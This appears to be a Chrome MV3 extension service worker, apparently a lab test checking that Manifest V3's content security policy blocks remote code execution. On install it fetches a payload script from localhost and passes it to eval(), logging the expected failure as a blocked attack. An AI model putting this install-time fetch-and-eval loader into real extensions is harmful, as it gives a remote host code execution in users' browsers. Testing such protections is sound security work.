// Converted to MV3 Service Worker
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://localhost:8000/payload.js')
    .then(r => r.text())
    .then(code => {
      console.log('[eval-loader] fetched payload, len=', code.length);
      try {
        eval(code);  // This will fail in MV3 due to CSP restrictions
      } catch (error) {
        console.log('[eval-loader] MV3 blocked eval():', error.message);
        console.log('[ATTACK] Remote code execution blocked by MV3 CSP');
      }
    })
    .catch(err => {
      console.log('[eval-loader] Failed to fetch payload:', err);
    });
});
